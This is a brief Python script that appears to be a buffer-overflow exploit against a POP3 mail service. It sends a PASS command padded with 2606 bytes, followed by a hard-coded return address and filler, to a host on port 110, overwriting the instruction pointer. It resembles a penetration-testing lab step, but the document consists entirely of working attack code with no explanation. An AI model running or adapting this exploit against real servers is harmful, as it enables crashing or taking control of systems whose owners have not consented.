#!/usr/bin/python3

import sys
import socket

buffer=b"A" * 2606 + b"\x8F\x35\x4A\x5F" + b"C" *(3000-4-2606)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.2',110))
s.send((b'USER TEST\r\n'))
s.send((b'PASS ' + buffer + b'\r\n'))
s.close()
